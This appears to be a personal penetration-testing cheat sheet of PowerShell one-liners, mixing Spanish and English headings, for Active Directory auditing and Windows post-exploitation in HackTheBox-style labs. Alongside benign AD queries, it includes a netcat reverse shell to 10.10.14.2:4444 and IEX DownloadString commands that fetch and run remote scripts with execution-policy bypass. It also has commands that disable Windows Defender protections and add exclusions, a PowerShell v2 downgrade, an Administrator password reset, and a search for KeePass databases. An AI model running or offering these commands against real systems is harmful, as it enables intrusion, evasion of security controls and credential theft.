# Powershell Commands

## AD

### Cuentas genericas como administradores de Dominio

```powershell
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Get-ADUser -Properties samaccountname, Name, Enabled | Select-Object samaccountname, Name, Enabled
```

## Cuentas de administradores de dominio no cumplen con las mejores practicas

```powershell
Get-ADGroupMember -Identity "Domain Admins" | Get-ADUser -Properties samaccountname, Name, PasswordLastSet, PasswordNeverExpires, Enabled | Select-Object samaccountname, Name, PasswordLastSet, PasswordNeverExpires, Enabled
```


### Contrasenas de usuarios de dominio que no expiran y estan habilitadas

```powershell
Get-ADGroupMember -Identity "Domain Users" | Get-ADUser -Properties samaccountname, Name, Enabled, PasswordNeverExpires | Select-Object samaccountname, Name, Enabled, PasswordNeverExpires | Export-Csv -Path .\users_expirepass.csv -NoTypeInformation 
```

### Machine quota

```powershell
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
```

## Windows oneliners

### Ping network

```powershell
1..254 | ForEach-Object { $ip = "192.168.210.$_"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { Write-Host "IP: $ip is Up" } }
```

### Search file

```powershell
Get-ChildItem -Path C:\ -Filter "file.ext" -Recurse -ErrorAction SilentlyContinue
```

### Search files C:\Users Directory

```powershell
Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue
```

### Change Password of Administrator

```powershell
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Password" -Force)
```

### Start Process

```powershell
Start-Process powershell -Verb runAs "\\10.10.14.2\share\nc.exe -e powershell 10.10.14.2 4444"
```

### Powershell bypass

```powershell
powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1'); Invoke-AllChecks”
```

### Shell base64

```powershell
# https://www.revshells.com/ -> Powershell #3 (Base64)
powershell.exe -e <base64 here>
```

### Import Powershell HTTP

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:80/script.ps1')
```

### Check if you are Administrator

```powershell
([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
True
```

### Check antivirus and disable

```powershell
Get-MpComputerStatus | Select-Object AntivirusEnabled
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
```

### PSRemoting is enabled

```powershell
Test-WSMan -Computername srv01.rastalabs.local
```

### Get Hash MD5

```powershell
(Get-FileHash -Path "C:\Windows\Temp\info.txt" -Algorithm MD5).Hash
```

## Find .kdb and .kdbx files

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -eq ".kdbx" -or $_.Extension -eq ".kdb" }
```

## TCP COnnection

```powershell
Test-NetConnection -ComputerName <Dirección_IP> -Port <Número_Puerto>
(New-Object System.Net.Sockets.TcpClient("127.0.0.1", "80")).Connected
```

## Change version

```powershell
PowerShell -Version 2
$PSVersionTable.PSVersion
```

## Add Exclusion Defender

```powershell
# Importar el módulo Defender
Import-Module Defender
# Agregar una carpeta a las exclusiones de Windows Defender
Add-MpPreference -ExclusionPath "C:\Ruta\De\La\Carpeta"
# Verificar que la exclusión se haya agregado correctamente
Get-MpPreference
```